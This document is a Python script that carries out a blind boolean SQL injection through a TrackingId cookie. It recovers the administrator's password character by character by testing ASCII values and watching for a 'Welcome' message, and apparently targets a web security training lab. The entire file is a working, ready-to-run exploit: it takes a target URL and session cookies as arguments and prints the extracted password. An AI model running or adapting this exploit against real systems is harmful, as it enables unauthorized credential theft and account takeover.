import requests  # This is used for making requests
import sys       # This Library is used for extracting the arguments which are being passed via cli
import urllib3
import urllib.parse # This library is used for URL-encoding our made injection payload

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url, TID, SID):
    print('URL:', url)
    password = ""
    
    # Only check a-z and 0-9
    allowed_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    list_of_characters = list(allowed_chars) # converting the String into list of characters
    password = '' # Empty password variable in which complete password will be saved
    
    # ! As password has 20 characters, so on each char we are going to run a for loop
    for charNo in range(1,21,1): 
        for character in list_of_characters:
            ascii_val = ord(character) # converting the character into ASCII value to embed in URL
            
            injection_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')=%s--"%(charNo,ascii_val)
            
            
            
            encoded_payload = urllib.parse.quote(injection_payload)
             
            # As each request will need a cookie tuple which will contain Tracking ID & Session ID which will be given by user
            
            cookies = {
                    'TrackingId': TID + encoded_payload,
                    'session': SID
            }
            
            response = requests.get(url, cookies=cookies, verify=False)
            
            if "Welcome" in response.text:
                password += character
                print("password String : ", password)
    
    print("Final Password is : ", password)
    
def main():
    url = sys.argv[1]
    TID = sys.argv[2]
    SID = sys.argv[3]
    sqli_password(url,TID,SID)

if __name__ == "__main__":
    main()
